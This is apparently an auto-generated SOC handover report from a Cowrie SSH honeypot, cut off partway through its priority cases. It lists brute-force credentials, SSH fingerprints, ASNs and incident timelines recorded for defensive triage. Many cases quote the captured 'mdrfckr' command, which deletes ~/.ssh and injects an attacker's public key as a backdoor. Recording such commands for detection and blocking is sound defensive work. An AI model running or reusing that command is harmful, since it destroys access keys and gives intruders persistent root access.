# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-05-04 |
| **Generated At** | 2026-05-04T14:10:43Z |
| **Shift Time** | 14:10 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · AWS EC2 · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **2107** |
| Confirmed Threats | **2056** |
| False Positives Filtered | **51** (2.4%) |
| Unique Attacker IPs | **42** |
| Countries of Origin | **24** |
| High Severity Cases | **53** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **2054** |
| Malware Samples Analyzed | **0** HIGH · **16** MED · 4 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **117** |
| Unique Credential Pairs | **67** |
| Unique Usernames | **26** |
| Unique Passwords | **66** |
| Successful Auth Pairs | **30** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `root` | 53 |
| `345gs5662d34` | 26 |
| `ubuntu` | 7 |
| `admin` | 4 |
| `ftpuser` | 2 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `345gs5662d34` | 26 |
| `3245gs5662d34` | 26 |
| `123456` | 2 |
| `ts3` | 1 |
| `Host: 13.235.92.17:2223` | 1 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `345gs5662d34` | `345gs5662d34` | 26 |
| `root` | `3245gs5662d34` | 26 |
| `teamspeak3` | `ts3` | 1 |
| `GET / HTTP/1.1` | `Host: 13.235.92.17:2223` | 1 |
| `User-Agent: curl/7.64.1` | `Accept: */*` | 1 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `root` | `12345678912` | `154.219.97.211` | 2026-05-04T11:03:19 |
| `root` | `3245gs5662d34` | `154.219.97.211` | 2026-05-04T11:03:22 |
| `root` | `a4s5d6` | `154.219.97.211` | 2026-05-04T11:04:31 |
| `root` | `Cv123456` | `154.219.97.211` | 2026-05-04T11:05:43 |
| `root` | `Password09!` | `154.219.97.211` | 2026-05-04T11:07:12 |
| `root` | `Ab1234567890` | `154.219.97.211` | 2026-05-04T11:08:24 |
| `root` | `@123456` | `154.219.97.211` | 2026-05-04T11:09:39 |
| `root` | `a123a123.` | `154.219.97.211` | 2026-05-04T11:12:01 |
| `root` | `Server_2025` | `154.219.97.211` | 2026-05-04T11:13:38 |
| `root` | `314159265` | `154.219.97.211` | 2026-05-04T11:14:53 |
| `root` | `Admin@1234567` | `154.219.97.211` | 2026-05-04T11:16:09 |
| `root` | `asif` | `154.219.97.211` | 2026-05-04T11:17:22 |
| `root` | `1234!@#$qwer` | `154.219.97.211` | 2026-05-04T11:18:52 |
| `root` | `Pf123456` | `154.219.97.211` | 2026-05-04T11:20:08 |
| `root` | `8888` | `154.219.97.211` | 2026-05-04T11:21:21 |
| `root` | `password321` | `154.219.97.211` | 2026-05-04T11:22:38 |
| `root` | `yt123456` | `154.219.97.211` | 2026-05-04T11:23:47 |
| `root` | `1qasw23edfr4` | `154.219.97.211` | 2026-05-04T11:24:58 |
| `root` | `777888999` | `154.219.97.211` | 2026-05-04T11:27:26 |
| `root` | `j0k3r` | `154.219.97.211` | 2026-05-04T11:28:39 |
| `root` | `User2024` | `154.219.97.211` | 2026-05-04T11:31:05 |
| `root` | `12qwaszx12` | `154.219.97.211` | 2026-05-04T11:32:21 |
| `root` | `yw123456` | `154.219.97.211` | 2026-05-04T11:33:41 |
| `root` | `wemagine!@#$4321` | `154.219.97.211` | 2026-05-04T11:37:15 |
| `root` | `admin_123!@#` | `147.45.174.46` | 2026-05-04T13:12:03 |
| `root` | `3245gs5662d34` | `147.45.174.46` | 2026-05-04T13:12:07 |
| `root` | `admin2020` | `147.45.174.46` | 2026-05-04T13:19:44 |
| `root` | `toor` | `185.71.233.73` | 2026-05-04T13:30:44 |
| `root` | `ubuntu1234` | `4.211.84.189` | 2026-05-04T13:33:21 |
| `root` | `3245gs5662d34` | `4.211.84.189` | 2026-05-04T13:33:25 |

---

## 🖥 SSH Fingerprint Intelligence

| Metric | Value |
|---|---|
| Total Sessions Parsed | **2107** |
| Sessions with Fingerprint | **5** |
| Unique HASSH Fingerprints | **5** |

**Client Family Distribution:**

| Client Family | Sessions |
|---|---|
| libssh | 117 |
| Unknown | 2 |
| Go SSH scanner | 1 |

**⚠️ Botnet/Scanner KEX Signatures Detected:**

| HASSH | Signature | Sessions | IPs |
|---|---|---|---|
| `af8223ac9914...` | libssh-based | 115 | 5 |
| `03a80b21afa8...` | Modern SSH client | 2 | 2 |
| `dd9bcf093c35...` | Mirai/variant | 1 | 1 |
| `9052c4ab4164...` | Mirai/variant | 1 | 1 |
| `748f8c627d3f...` | Mirai/variant | 1 | 1 |

**Top Fingerprints:**

| HASSH | Client | Sessions | IPs | Botnet Sig |
|---|---|---|---|---|
| `af8223ac9914...` | libssh | 115 | 5 | libssh-based |
| `03a80b21afa8...` | libssh | 2 | 2 | Modern SSH client |
| `dd9bcf093c35...` | Unknown | 1 | 1 | Mirai/variant |
| `9052c4ab4164...` | Go SSH scanner | 1 | 1 | Mirai/variant |
| `748f8c627d3f...` | Unknown | 1 | 1 | Mirai/variant |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **2** |
| Campaign Clusters | **1** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 26 | 3 | `T1021.004, T1078, T1070, T1140` |

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
Source IPs: `147.45.174.46`, `154.219.97.211`, `4.211.84.189`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **42** |
| Unique ASNs | **36** |
| High-Risk ASNs | **18** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS8075` | Microsoft Corporation | 3 | HIGH |
| `AS8151` | UNINET | 2 | LOW |
| `AS24560` | Bharti Airtel Ltd., Telemedia Services | 2 | LOW |
| `AS137718` | Beijing Volcano Engine Technology Co., Ltd. | 2 | HIGH |
| `AS8193` | Uzbektelekom Joint Stock Company | 2 | MEDIUM |
| `AS138754` | Kerala Vision Broad Band Private Limited | 1 | LOW |
| `AS9541` | Cyber Internet Services (Pvt) Ltd. | 1 | MEDIUM |
| `AS133648` | MNR Broadband Services Pvt. Ltd. | 1 | LOW |

---

---

## 🚨 Priority Cases — Immediate Attention (53)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-13d0a3da2479

| Field | Detail |
|---|---|
| **Source IP** | `154.219.97[.]211` |
| **First Seen** | 2026-05-04 11:03 |
| **Last Seen** | 2026-05-04 11:03 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-04 11:03:19` | `cowrie.session.connect` |
| `2026-05-04 11:03:19` | `cowrie.client.version` |
| `2026-05-04 11:03:19` | `cowrie.client.kex` |
| `2026-05-04 11:03:19` | `cowrie.login.success` |
| `2026-05-04 11:03:20` | `cowrie.session.params` |
| `2026-05-04 11:03:20` | `cowrie.command.input` |
| `2026-05-04 11:03:20` | `cowrie.command.failed` |
| `2026-05-04 11:03:20` | `cowrie.log.closed` |
| `2026-05-04 11:03:20` | `cowrie.session.params` |
| `2026-05-04 11:03:20` | `cowrie.command.input` |
| `2026-05-04 11:03:20` | `cowrie.session.file_download` |
| `2026-05-04 11:03:20` | `cowrie.log.closed` |
| `2026-05-04 11:03:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `154.219.97[.]211` to AbuseIPDB if not already reported
- [ ] Block `154.219.97[.]211` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d310ce1b8409

| Field | Detail |
|---|---|
| **Source IP** | `154.219.97[.]211` |
| **First Seen** | 2026-05-04 11:03 |
| **Last Seen** | 2026-05-04 11:03 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-04 11:03:22` | `cowrie.session.connect` |
| `2026-05-04 11:03:22` | `cowrie.client.version` |
| `2026-05-04 11:03:22` | `cowrie.client.kex` |
| `2026-05-04 11:03:22` | `cowrie.login.success` |
| `2026-05-04 11:03:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `154.219.97[.]211` to AbuseIPDB if not already reported
- [ ] Block `154.219.97[.]211` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3d9be5042cfa

| Field | Detail |
|---|---|
| **Source IP** | `154.219.97[.]211` |
| **First Seen** | 2026-05-04 11:04 |
| **Last Seen** | 2026-05-04 11:04 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-04 11:04:30` | `cowrie.session.connect` |
| `2026-05-04 11:04:30` | `cowrie.client.version` |
| `2026-05-04 11:04:30` | `cowrie.client.kex` |
| `2026-05-04 11:04:31` | `cowrie.login.success` |
| `2026-05-04 11:04:31` | `cowrie.session.params` |
| `2026-05-04 11:04:31` | `cowrie.command.input` |
| `2026-05-04 11:04:31` | `cowrie.command.failed` |
| `2026-05-04 11:04:31` | `cowrie.log.closed` |
| `2026-05-04 11:04:31` | `cowrie.session.params` |
| `2026-05-04 11:04:31` | `cowrie.command.input` |
| `2026-05-04 11:04:31` | `cowrie.session.file_download` |
| `2026-05-04 11:04:31` | `cowrie.log.closed` |
| `2026-05-04 11:04:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `154.219.97[.]211` to AbuseIPDB if not already reported
- [ ] Block `154.219.97[.]211` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cfe893158070

| Field | Detail |
|---|---|
| **Source IP** | `154.219.97[.]211` |
| **First Seen** | 2026-05-04 11:04 |
| **Last Seen** | 2026-05-04 11:04 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-04 11:04:33` | `cowrie.session.connect` |
| `2026-05-04 11:04:33` | `cowrie.client.version` |
| `2026-05-04 11:04:33` | `cowrie.client.kex` |
| `2026-05-04 11:04:34` | `cowrie.login.success` |
| `2026-05-04 11:04:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `154.219.97[.]211` to AbuseIPDB if not already reported
- [ ] Block `154.219.97[.]211` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-aa0f604e9cc9

| Field | Detail |
|---|---|
| **Source IP** | `154.219.97[.]211` |
| **First Seen** | 2026-05-04 11:05 |
| **Last Seen** | 2026-05-04 11:05 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-04 11:05:42` | `cowrie.session.connect` |
| `2026-05-04 11:05:42` | `cowrie.client.version` |
| `2026-05-04 11:05:43` | `cowrie.client.kex` |
| `2026-05-04 11:05:43` | `cowrie.login.success` |
| `2026-05-04 11:05:43` | `cowrie.session.params` |
| `2026-05-04 11:05:43` | `cowrie.command.input` |
| `2026-05-04 11:05:43` | `cowrie.command.failed` |
| `2026-05-04 11:05:43` | `cowrie.log.closed` |
| `2026-05-04 11:05:44` | `cowrie.session.params` |
| `2026-05-04 11:05:44` | `cowrie.command.input` |
| `2026-05-04 11:05:44` | `cowrie.session.file_download` |
| `2026-05-04 11:05:44` | `cowrie.log.closed` |
| `2026-05-04 11:05:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `154.219.97[.]211` to AbuseIPDB if not already reported
- [ ] Block `154.219.97[.]211` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-aa567006abae

| Field | Detail |
|---|---|
| **Source IP** | `154.219.97[.]211` |
| **First Seen** | 2026-05-04 11:05 |
| **Last Seen** | 2026-05-04 11:05 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-04 11:05:46` | `cowrie.session.connect` |
| `2026-05-04 11:05:46` | `cowrie.client.version` |
| `2026-05-04 11:05:46` | `cowrie.client.kex` |
| `2026-05-04 11:05:46` | `cowrie.login.success` |
| `2026-05-04 11:05:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `154.219.97[.]211` to AbuseIPDB if not already reported
- [ ] Block `154.219.97[.]211` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cce21b13f02b

| Field | Detail |
|---|---|
| **Source IP** | `154.219.97[.]211` |
| **First Seen** | 2026-05-04 11:07 |
| **Last Seen** | 2026-05-04 11:07 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-04 11:07:11` | `cowrie.session.connect` |
| `2026-05-04 11:07:11` | `cowrie.client.version` |
| `2026-05-04 11:07:11` | `cowrie.client.kex` |
| `2026-05-04 11:07:12` | `cowrie.login.success` |
| `2026-05-04 11:07:12` | `cowrie.session.params` |
| `2026-05-04 11:07:12` | `cowrie.command.input` |
| `2026-05-04 11:07:12` | `cowrie.command.failed` |
| `2026-05-04 11:07:12` | `cowrie.log.closed` |
| `2026-05-04 11:07:12` | `cowrie.session.params` |
| `2026-05-04 11:07:12` | `cowrie.command.input` |
| `2026-05-04 11:07:12` | `cowrie.session.file_download` |
| `2026-05-04 11:07:12` | `cowrie.log.closed` |
| `2026-05-04 11:07:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `154.219.97[.]211` to AbuseIPDB if not already reported
- [ ] Block `154.219.97[.]211` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-878d55306f38

| Field | Detail |
|---|---|
| **Source IP** | `154.219.97[.]211` |
| **First Seen** | 2026-05-04 11:07 |
| **Last Seen** | 2026-05-04 11:07 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-04 11:07:14` | `cowrie.session.connect` |
| `2026-05-04 11:07:14` | `cowrie.client.version` |
| `2026-05-04 11:07:14` | `cowrie.client.kex` |
| `2026-05-04 11:07:15` | `cowrie.login.success` |
| `2026-05-04 11:07:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `154.219.97[.]211` to AbuseIPDB if not already reported
- [ ] Block `154.219.97[.]211` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bbd005935162

| Field | Detail |
|---|---|
| **Source IP** | `154.219.97[.]211` |
| **First Seen** | 2026-05-04 11:08 |
| **Last Seen** | 2026-05-04 11:08 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-04 11:08:24` | `cowrie.session.connect` |
| `2026-05-04 11:08:24` | `cowrie.client.version` |
| `2026-05-04 11:08:24` | `cowrie.client.kex` |
| `2026-05-04 11:08:24` | `cowrie.login.success` |
| `2026-05-04 11:08:25` | `cowrie.session.params` |
| `2026-05-04 11:08:25` | `cowrie.command.input` |
| `2026-05-04 11:08:25` | `cowrie.command.failed` |
| `2026-05-04 11:08:25` | `cowrie.log.closed` |
| `2026-05-04 11:08:25` | `cowrie.session.params` |
| `2026-05-04 11:08:25` | `cowrie.command.input` |
| `2026-05-04 11:08:25` | `cowrie.session.file_download` |
| `2026-05-04 11:08:25` | `cowrie.log.closed` |
| `2026-05-04 11:08:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `154.219.97[.]211` to AbuseIPDB if not already reported
- [ ] Block `154.219.97[.]211` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-053361850be0

| Field | Detail |
|---|---|
| **Source IP** | `154.219.97[.]211` |
| **First Seen** | 2026-05-04 11:08 |
| **Last Seen** | 2026-05-04 11:08 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-04 11:08:27` | `cowrie.session.connect` |
| `2026-05-04 11:08:27` | `cowrie.client.version` |
| `2026-05-04 11:08:27` | `cowrie.client.kex` |
| `2026-05-04 11:08:27` | `cowrie.login.success` |
| `2026-05-04 11:08:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `154.219.97[.]211` to AbuseIPDB if not already reported
- [ ] Block `154.219.97[.]211` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fe0cd377da51

| Field | Detail |
|---|---|
| **Source IP** | `154.219.97[.]211` |
| **First Seen** | 2026-05-04 11:09 |
| **Last Seen** | 2026-05-04 11:09 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-04 11:09:38` | `cowrie.session.connect` |
| `2026-05-04 11:09:38` | `cowrie.client.version` |
| `2026-05-04 11:09:38` | `cowrie.client.kex` |
| `2026-05-04 11:09:39` | `cowrie.login.success` |
| `2026-05-04 11:09:39` | `cowrie.session.params` |
| `2026-05-04 11:09:39` | `cowrie.command.input` |
| `2026-05-04 11:09:39` | `cowrie.command.failed` |
| `2026-05-04 11:09:39` | `cowrie.log.closed` |
| `2026-05-04 11:09:39` | `cowrie.session.params` |
| `2026-05-04 11:09:39` | `cowrie.command.input` |
| `2026-05-04 11:09:39` | `cowrie.session.file_download` |
| `2026-05-04 11:09:39` | `cowrie.log.closed` |
| `2026-05-04 11:09:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `154.219.97[.]211` to AbuseIPDB if not already reported
- [ ] Block `154.219.97[.]211` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d56e866e4849

| Field | Detail |
|---|---|
| **Source IP** | `154.219.97[.]211` |
| **First Seen** | 2026-05-04 11:09 |
| **Last Seen** | 2026-05-04 11:09 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-04 11:09:41` | `cowrie.session.connect` |
| `2026-05-04 11:09:41` | `cowrie.client.version` |
| `2026-05-04 11:09:41` | `cowrie.client.kex` |
| `2026-05-04 11:09:42` | `cowrie.login.success` |
| `2026-05-04 11:09:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `154.219.97[.]211` to AbuseIPDB if not already reported
- [ ] Block `154.219.97[.]211` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d778580ba902

| Field | Detail |
|---|---|
| **Source IP** | `154.219.97[.]211` |
| **First Seen** | 2026-05-04 11:12 |
| **Last Seen** | 2026-05-04 11:12 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
